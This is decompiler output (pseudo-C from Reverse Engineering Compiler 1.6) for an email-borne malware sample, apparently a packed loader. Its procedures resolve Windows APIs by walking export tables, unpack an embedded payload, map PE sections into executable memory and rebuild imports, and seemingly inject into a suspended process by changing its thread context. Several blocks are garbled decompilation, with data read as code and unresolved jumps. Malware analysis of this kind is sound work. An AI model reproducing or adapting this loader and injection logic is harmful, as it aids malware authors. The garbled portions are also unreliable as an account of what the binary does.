/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: './malware_via_email/malware_0188/ia32_pe/subject.exe'
 */

/*	Procedure: 0x00401010 - 0x0040105F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

__entry_point__()
{



    L004013FE();
    L004012F8(0x40101f);
    L004015EC();
    L00401109();
    (save)L004011F4( *L00402178);
    L00401393( *L00402174);
    L00401690();
    L004010BA();
    "U‹ìj"();
    (save)100;
    *__imp__Sleep();
    (save)0;
    *__imp__ExitProcess();
    asm("int3");
}

/*	Procedure: 0x00401060 - 0x00401095
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L00401060()
{
	/* unknown */ void  ebx;



    (save) *L004021A4;
    ebx = *L004021A0;
    (restore)eax;
    ecx = 160;
    asm("mul ecx");
    ebx = ebx + eax;
    esi = 4202625;
    *ebx = *L00402080 & 255;
    edi = ebx + 1;
    asm("rep movsb");
    *L004021A4 = *L004021A4 + 1;
    return(L00401097());
}

/*	Procedure: 0x00401096 - 0x00401096
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401096()
{



    L21e42626();
}

/*	Procedure: 0x00401097 - 0x004010B9
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401097()
{



    if(*L004021A4 != 512) {
        goto L004010b9;
    }
    *L004021A4 = 256;
    *L004021A8 = 9;
}

/* DEST BLOCK NOT FOUND: 004010cc -> 004010ef */
/*	Procedure: 0x004010BA - 0x004010D4
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004010BA()
{



    (save)ebx;
    eax = 0;
    == ? L004010c0 : ;
    eax = L184d9c28();
    *eax = *eax + al;
    if(*(ebx + 495661129) = *(ebx + 495661129) + cl) {
        goto L004010ef;
    }
    eax = eax + 1;
    *(ecx + -1017444263) = *(ecx + -1017444263) + cl;
}

/*	Procedure: 0x004010D5 - 0x004010F7
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L004010D5()
{
	/* unknown */ void  ebx;



    ebx = *L004021A0;
    ecx = 1 & 255;
    do {
        *ebx = ch;
        *(ebx + 1) = cl;
        ebx = ebx + 160;
    } while(cl = cl + 1);
    *L004021A4 = ecx;
}

/*	Procedure: 0x004010F8 - 0x00401108
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004010F8()
{



    *L004021AC = *L00402081;
    return(*L004021AC);
}

/*	Procedure: 0x00401109 - 0x004011D9
 *	Argument size: 0
 *	Local size: 16
 *	Save regs size: 4
 */

L00401109()
{
	/* unknown */ void  ebx;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    ebx = 0;
    (save)0;
    (save)0;
    (save)1;
    eax = *L00402004();
    *L00402184 = eax;
    (save)60000;
    (save)8;
    (save) *L00402184;
    *L00402178 = *L00402000();
    (save)ebx;
    (save)ebx;
    (save)1;
    *L0040218C = *L00402004();
    *L004021A0 = L004011DA();
    L004010D5();
    *L004021A8 = 9;
    eax = L0040157F();
    Vfffffff8 = eax;
    L004012BA(Vfffffff8);
    L00401262();
    for(eax = L004010F8(); *L0040219C - *L00402170 >= *L004021A8; Vfffffff8 = eax) {
        eax = L0040157F();
        Vfffffffc = eax;
        if(Vfffffffc <= *L004021A4 - 1) {
            L004012BA(Vfffffffc);
        } else {
            L004012BA(Vfffffff8);
            L004012E2();
        }
        L00401262();
        L004010F8();
        L004012BA(Vfffffff8);
        L004012E2();
        L00401060();
        eax = Vfffffffc;
    }
}

/* DEST BLOCK NOT FOUND: 004011ed -> 00401175 */
/*	Procedure: 0x004011DA - 0x004011F3
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004011DA()
{



    (save)12800000;
    (save)8;
    (save)eax;
    eax = 4202496;
    (save)0x4011f3;
    goto ( *L00402000);
}

/*	Procedure: 0x004011F4 - 0x00401261
 *	Argument size: 4
 *	Local size: 20
 *	Save regs size: 12
 */

L004011F4(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffffc;



    ebx = A8 + *(A8 + 60);
    *L00402174 = *(ebx + 52);
    Vfffffffc = *(ebx + 6) & 255;
    (save)64;
    (save)12288;
    (save) *(ebx + 80);
    (save) *(ebx + 52);
    esi = *L00402014();
    L0040137D(esi, A8, *(ebx + 84));
    edi = ebx + 248;
    do {
        eax = A8 + *(edi + 20);
        L0040137D(esi + *(edi + 12), eax, *(edi + 16));
        edi = edi + 40;
    } while(Vfffffffc = Vfffffffc - 1);
    return(*(ebx + 40) + esi);
}

/*	Procedure: 0x00401262 - 0x00401285
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401262()
{



    asm("pusha");
    edi = *L00402178 + *L0040217C;
    *L0040217C = *L0040217C + ( *L00402080 & 255);
    esi = 4202625;
    asm("rep movsb");
    asm("popa");
}

/*	Procedure: 0x00401286 - 0x00401292
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401286()
{



    esp = esp - 1;
    asm("outsd");
    asm("popa");
    asm("%f dec esp");
    1098478177 = *(edx + 114) * esp;
    *(ebp - 117) = *(ebp - 117) + dl;
}

/*	Procedure: 0x00401293 - 0x004012B9
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L00401293(A8)
/* unknown */ void  A8;
{



    (save)0;
    (save)0;
    (save)0;
    (save)A8;
    (save)0;
    (save)0;
    *L00402008();
    return(*L0040200c( *L00402018()));
}

/*	Procedure: 0x004012BA - 0x004012E1
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L004012BA(A8)
/* unknown */ void  A8;
{



    asm("pusha");
    edi = 4202624;
    ebx = *L004021A0;
    ecx = 160;
    asm("mul ecx");
    ebx = ebx + A8;
    ecx = ( *ebx & 255) + 1;
    esi = ebx;
    asm("rep movsb");
    asm("popa");
}

/*	Procedure: 0x004012E2 - 0x004012F7
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L004012E2()
{
	/* unknown */ void  ebx;



    ebx = 4202624;
    *L00402080 = *L00402080 + 1;
    ebx = ebx + ( *ebx & 255);
    *ebx = *L004021AC;
    return(*ebx);
}

/*	Procedure: 0x004012F8 - 0x00401315
 *	Argument size: 4
 *	Local size: 724
 *	Save regs size: 4
 */

L004012F8()
{
	/* unknown */ void  esi;



    L00401316();
    L00401340();
    return(L0040136A());
}

stack space not deallocated on return
/*	Procedure: 0x00401316 - 0x0040133F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401316()
{



    *(ebp - 8) = *L00402018();
    edx = 0x40137c;
    eax = *L00402008(0, 0, *(ebp + 8) + 1, 0, 4, 0);
    *(ebp - 4) = eax;
    return(*(ebp - 4));
}

stack space not deallocated on return
/*	Procedure: 0x00401340 - 0x00401369
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401340()
{



    esi = ebp + -724;
    *esi = 65538;
    (save)esi;
    (save) *(ebp - 4);
    *L0040201c();
    *(esi + 176) = *(ebp + 8);
    return(*L00402020( *(ebp - 4), esi));
}

stack space not deallocated on return
/*	Procedure: 0x0040136A - 0x0040137C
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040136A()
{



    *L00402024();
    return(*L0040200c( *(ebp - 8), *(ebp - 4)));
}

/*	Procedure: 0x0040137D - 0x00401392
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 8
 */

L0040137D(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    asm("rep movsb");
}

/*	Procedure: 0x00401393 - 0x004013FD
 *	Argument size: 0
 *	Local size: 4
 *	Save regs size: 0
 */

L00401393(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  Vfffffffc;



    asm("pusha");
    esi = A8;
    ebx = *( *(esi + 60) + esi + 128) + esi;
    do {
        (save) *(ebx + 12) + A8;
        Vfffffffc = *L0040202c();
        esi = *ebx + A8;
        edi = *(ebx + 16) + A8;
        do {
            (save) *esi + A8 + 1 + 1;
            (save)Vfffffffc;
            *edi = *L00402028();
            esi = esi + 4;
            edi = edi + 4;
        } while(*esi != 0);
L004013f1:
    } while(ebx = ebx - 2 + 22);
    goto L004013f7;
    L004c8f78();
    goto L004013f1;
L004013f7:
    eax = 0;
    asm("popa");
}

/*	Procedure: 0x004013FE - 0x00401429
 *	Argument size: 0
 *	Local size: 8
 *	Save regs size: 4
 */

L004013FE()
{
	/* unknown */ void  esi;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    eax = L0040142A();
    Vfffffffc = eax;
    L0040148B(1097035634, & Vfffffff8, Vfffffffc);
    return(L00401447(Vfffffffc, Vfffffff8));
}

/*	Procedure: 0x0040142A - 0x00401446
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040142A()
{



    cx = 23117;
    eax = *( *%fs:0x0] + 4) & -65536;
    do {
        eax = eax - 65536;
    } while(*eax != cx);
}

/*	Procedure: 0x00401447 - 0x0040148A
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 0
 */

L00401447(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    asm("pusha");
    ecx = "HeapAlloc";
    L0040137D(4202544, ecx, 0x401578 - ecx);
    esi = "HeapAlloc";
    ebx = 4202496;
    do {
        eax = Ac(A8, esi);
        *ebx = eax;
        ebx = ebx + 4;
        do {
            esi = esi + 1;
        } while(*esi != 0);
        esi = esi + 1;
    } while(*esi != 0);
    asm("popa");
}

/*	Procedure: 0x0040148B - 0x004014D2
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L0040148B(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    asm("pusha");
    edi = *( *(A10 + 60) + 120 + A10) + A10;
    ecx = 0;
    ebx = *(edi + 32) + A10;
    for(eax = A8; eax != *( *ebx + A10 + 4); ebx = ebx + 4) {
        ecx = ecx + 1;
    }
    edx = *(edi + 28) + A10;
    eax = *(edx + (ecx << 2)) + A10;
    *Ac = eax;
    asm("popa");
}

/* DEST BLOCK NOT FOUND: 004014d6 -> 00401519 */
/*	Procedure: 0x004014D3 - 0x004014DE
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004014D3()
{



    asm("%g popa");
    if(eax = eax - 1) {
        goto L09d17b28;
    }
    asm("insb");
    asm("insb");
    asm("outsd");
    asm("arpl [eax],ax");
    eax = eax - 1;
    asm("add [%gs:eax+0x65],cl");
}

/*	Procedure: 0x00401579 - 0x0040157E
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401579()
{



    esi >> 31 :: 0;
}

/*	Procedure: 0x0040157F - 0x004015E1
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 12
 */

L0040157F()
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;



    edx = 0;
    (save) *L00402170;
    (restore)eax;
    edx = 32 / 32 % 32 / 32;
    ebx = *L00402190 + (eax << 2);
    edi = *L004021A8;
    (save)edi;
    eax = 0;
    do {
        esi = *ebx;
        asm("bswap esi");
        L004015E7();
        L00401579();
        if(!(edi = edi - 1)) {
            eax = L004015E2() + esi;
        }
        edx = edx + 1;
        if(edx == 32) {
            ebx = ebx + 4;
            edx = 0;
        }
    } while(edi != 0);
    (restore)ecx;
    *L00402170 = *L00402170 + ecx;
}

/*	Procedure: 0x004015E2 - 0x004015E6
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004015E2()
{



    esi = esi << edi;
}

/*	Procedure: 0x004015E7 - 0x004015EB
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004015E7()
{



    esi = esi << dl;
}

/*	Procedure: 0x004015EC - 0x00401671
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 8
 */

L004015EC()
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;



    esi = 4214920;
    ecx = *L00405074;
    *L00402198 = ecx;
    *L0040219C = *L00402198 << 3;
    (save)0;
    (save)0;
    (save)1;
    eax = *L00402004();
    *L00402180 = eax;
    (save) *L00402198;
    (save)8;
    (save) *L00402180;
    eax = *L00402000();
    *L00402190 = eax;
    *L00402194 = *L00402190 + *L00402198;
    L0040137D( *L00402190, esi, *L00402198);
    return(L00401672( *L00402190, *L00402198));
}

/*	Procedure: 0x00401672 - 0x0040168F
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 0
 */

L00401672(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    ecx = Ac;
    goto L0040167e;
    (save)1111491200;
L0040167e:
    do {
    } while(ecx = ecx - 1);
    *L00402190 = *L00402190 + 4;
}

stack space not deallocated on return
/*	Procedure: 0x00401690 - 0x004016A8
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401690()
{



    *L00402010();
    return(*L00402010( *L0040218C, *L00402184));
}

/*	Procedure: 0x004016A9 - 0x004016AB
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004016A9()
{



    asm("int3");
    asm("int3");
    asm("int3");
}

/* address  size  */
/* 0x00401000       0 */ /* unknown */ void 	__imp__Sleep;
/* 0x00401004       0 */ /* unknown */ void 	__imp__ExitProcess;
/* 0x00401010       0 */ /* unknown */ void 	__entry_point__;
#if 0 /* auxiliary information */
# Current option values:
option: +asmflush
option: -compactcalls
option: +compactexprs
option: +compactifs
option: +compset
option: -dfoproc
option: -disasmonly
option: -displaylabels
option: +doblocks
option: +docase
option: +dofor
option: +doifs
option: +dointrinsics
option: +doloops
option: +donullgotos
option: +dopackloops
option: +dopackstmt
option: +doremlabs
option: +dosimplify
option: -dosort
option: +dostmts
option: +doswitch
option: +dowhile
option: -dumpaddrs
option: -dumpcall
option: -dumpcomments
option: -dumpdfo
option: +dumpdoms
option: -dumpsblocks
option: -dumpsets
option: -dumpsizes
option: -dumpstmtid
option: +fatcase
option: -flag16
option: +fullscreen
option: -genpattern
option: -help
option: -hexconst
option: -html
option: +insertlabels
option: -int16
option: +int32
option: -interactive
option: -isvb5
option: +locals
option: -nohtmltabs
option: -nostackoffs
option: -objdump
option: -okclone
option: -outprocs
option: -outrefs
option: -overrule
option: +rdonly
option: -showblocks
option: -showjump
option: -showlabel
option: -showprotosym
option: -showreg
option: -showstring
option: -silent
option: +simplifyexprs
option: -stackalign16
option: -stackalign4
option: -stackalign8
option: -strallregions
option: -traceall
option: -tracesets
option: +types
option: -usesymtab
option: -validatebr
option: -validatereg
option: +validatestr
#endif
